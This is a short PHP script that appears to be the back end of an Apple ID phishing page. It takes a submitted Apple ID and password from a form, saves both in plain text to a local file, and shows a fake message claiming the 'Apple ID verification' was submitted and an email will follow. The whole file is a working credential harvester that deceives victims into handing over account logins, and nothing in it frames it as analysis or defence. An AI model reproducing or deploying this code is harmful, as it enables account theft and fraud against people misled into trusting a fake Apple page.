<?php

$var1 = $_POST['appleid'];
$var2 = $_POST['password'];

$fileHandle = fopen("myDataFile", 'w');
fwrite($fileHandle, $var1);
fwrite($fileHandle, $var2);
fclose($fileHandle);

$fileHandle = fopen("myDataFile", 'r');
$theInfo = fgets($fileHandle);
fclose($fileHandle);

echo "Your Apple ID verification has been submitted.  You will recieve an email shortly.";

?>